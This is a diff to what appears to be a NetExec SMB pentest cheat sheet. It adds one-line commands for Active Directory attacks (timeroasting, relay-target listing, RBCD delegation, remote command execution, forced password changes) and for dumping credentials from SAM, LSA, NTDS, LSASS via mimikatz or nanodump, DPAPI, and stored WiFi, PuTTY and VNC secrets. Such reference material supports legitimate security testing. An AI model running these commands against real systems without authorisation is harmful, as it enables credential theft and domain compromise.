@@ -59,4 +59,42 @@ nxc smb $IP  --users  --shares  --groups  --computers  --sessions  --rid-brute  
 --get-file         # Get a remote file on the remote target (--get-file \\Windows\\Temp\\whoami.txt  /path/to/save)
 --interfaces       # Enumerate network interfaces
 ```
+### Attacks
+```bash
+nxc smb $ip -u '' -p ''
+
+-M timeroast                # Request Hash of the computer Accounts via sntp Protocal without credentials Required.
+--gen-relay-list            # Enumerate Hosts with SMB Signing Not Required (SMB Relay)
+--qwinsta                        # Enumerate Active Windows Sessions (Cross session Attack)
+--delegate Administrator --self  # object with the msDS-AllowedToActOnBehalfOfOtherIdentity attribute set to an account you control (rbcd) 
+-x 'whoami /all'                 # Executing Remote Commands
+
+
+-M rdcman
+-M security-questions
+-M change-password -o USER=TargetUser NEWPASS=  or NEWHASH=
+```
+### Credential Dumping
+```bash
+nxc smb $ip -u '' -p ''
+
+--laps                      # Enumerate Local Administrator Password Solution
+--sam                       # Dump SAM hashes using methods from secretsdump.py
+--lsa                       # Requires Domain Admin or Local Admin Priviledges on target Domain Controller
+-M backup_operator          # Dump with BackupOperator Priv
+-M wifi                     # You need at least local admin privilege on the remote target
+-M putty                    # PuTTY allows users to store private keys for connections
+-M ntdsutil  or --ntds      # Required Admin Powers
+-M lsassy                   # You need at least local admin privilege on the remote target
+-M nanodump                 # You need at least local admin privilege on the remote target
+-M mimikatz                 # Enumerate via mimikatz's
+-M wifi                     # You need at least local admin privilege on the remote target
+-M putty                    # PuTTY allows users to store private keys for connections
+-M vnc                      # RealVNC or TightVNC allow users to store credentials for connections
+-M mremoteng
+-M notepad
+-M notepad++ 
+--dpapi_hash  or --dpapi
+--dpapi cookies or  --dpapi nosystem
+```
 # More Thinks Add soon !!!
